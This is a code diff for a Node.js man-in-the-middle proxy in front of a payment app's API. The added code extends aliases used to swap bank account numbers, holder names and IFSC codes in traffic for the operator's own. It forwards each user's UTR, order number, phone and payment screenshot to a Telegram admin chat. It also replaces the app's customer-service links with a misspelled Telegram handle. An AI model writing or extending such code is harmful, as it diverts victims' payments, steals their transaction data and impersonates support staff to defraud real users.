@@ -369,6 +369,7 @@ const BANK_FIELDS = {
   'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
   'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
   'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
+  'accname': 'accountHolder',
   'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
   'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
   'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
@@ -395,7 +396,7 @@ function replaceBankInUrl(urlStr, bank) {
   if (!urlStr.includes('://') && !urlStr.includes('?')) return urlStr;
   const urlParams = [
     { names: ['account', 'accountNo', 'account_no', 'accountno', 'account_number', 'accountNumber', 'acc', 'receiveAccountNo', 'receiver_account', 'pa'], value: bank.accountNo },
-    { names: ['name', 'accountName', 'account_name', 'accountname', 'receiveAccountName', 'receiver_name', 'beneficiary_name', 'beneficiaryName', 'pn', 'holder_name'], value: bank.accountHolder },
+    { names: ['name', 'accountName', 'account_name', 'accountname', 'accName', 'receiveAccountName', 'receiver_name', 'beneficiary_name', 'beneficiaryName', 'pn', 'holder_name'], value: bank.accountHolder },
     { names: ['ifsc', 'ifsc_code', 'ifscCode', 'receiveIfsc', 'IFSC'], value: bank.ifsc }
   ];
   let result = urlStr;
@@ -1244,9 +1245,25 @@ app.post('/app/buy/order/submitUtr', async (req, res) => {
     const body = req.parsedBody || {};
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
       const phone = getPhone(data, userId);
-      bot.sendMessage(data.adminChatId, `📤 UTR Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nUTR: ${body.utr || body.transactionId || body.referenceNo || 'N/A'}\nOrder: ${body.orderId || body.orderNo || body.buyOrderId || 'N/A'}`).catch(()=>{});
+      const utrVal = body.trxId || body.utr || body.transactionId || body.referenceNo || 'N/A';
+      const orderVal = body.orderNo || body.orderId || body.buyOrderId || 'N/A';
+      const imgVal = body.imgUrl || '';
+      let msg = `📤 UTR Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nUTR: ${utrVal}\nOrder: ${orderVal}`;
+      if (imgVal) msg += `\nScreenshot: ${imgVal}`;
+      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
+      if (imgVal) {
+        try {
+          const imgResp = await fetch(imgVal.startsWith('http') ? imgVal : ORIGINAL_API + '/' + imgVal);
+          if (imgResp.ok) {
+            const imgBuf = Buffer.from(await imgResp.arrayBuffer());
+            if (imgBuf.length > 100) {
+              await bot.sendPhoto(data.adminChatId, imgBuf, { caption: `📸 Payment Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nUTR: ${utrVal}\nOrder: ${orderVal}` }, { filename: 'screenshot.jpg', contentType: 'image/jpeg' });
+            }
+          }
+        } catch(e) {}
+      }
     }
-    if (userId) { trackUser(data, userId, `UTR ${body.utr || body.transactionId || ''}`); saveData(data).catch(()=>{}); }
+    if (userId) { trackUser(data, userId, `UTR ${body.trxId || body.utr || body.transactionId || ''}`); saveData(data).catch(()=>{}); }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
@@ -1600,6 +1617,13 @@ app.all('/app/customer/service', async (req, res) => {
   const data = await loadData();
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const telegramLink = 'https://t.me/customerservce_999pay';
+    if (jsonResp && jsonResp.data && Array.isArray(jsonResp.data)) {
+      jsonResp.data = jsonResp.data.map(item => ({
+        ...item,
+        serviceLink: telegramLink
+      }));
+    }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
